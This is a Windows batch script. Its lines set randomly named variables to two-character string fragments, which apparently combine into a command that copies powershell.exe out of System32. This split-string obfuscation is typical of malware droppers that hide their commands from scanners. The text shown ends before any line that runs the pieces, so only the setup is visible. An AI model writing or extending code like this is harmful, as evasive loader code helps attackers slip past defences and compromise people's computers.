@echo off
set "HQiWOhHpZe=:\"
set "kVWTblsVDO=he"
set "hdOlpACykD=co"
set "XTWDZZTjtC=po"
set "JEKpTiEaXO=32"
set "qCqhjoBLwf=ll"
set "GJXXZeVGKK=Po"
set "enwUbPmchx=em"
set "VpezVSjFzJ=xe"
set "alWGxZwgvK=.e"
set "NHnxiSPmzW=py"
set "QTqKpQZXdZ=st"
set "xEIeFikGDI=in"
set "EypgksjCfj=\W"
set "WFtaWDEfVn=Wi"
set "jRkKtDPejS=ll"
set "jmUhYuNNwE= /"
set "jhLYXzEtJZ=rS"
set "ZlcMAyYYZA=\v"
set "VpSDTmibRh=do"
set "zCWLzcbDnG=1."
set "lAnvaxCMeJ=s\"
set "AZtnTwyCTE=y "
set "OfFvWWzrIb=ow"
set "mYapvFXpKJ=ws"
set "XXxpSpFLnX=we"
set "vGBFyisabC=Sy"
set "XKhyGGREOJ=0\"
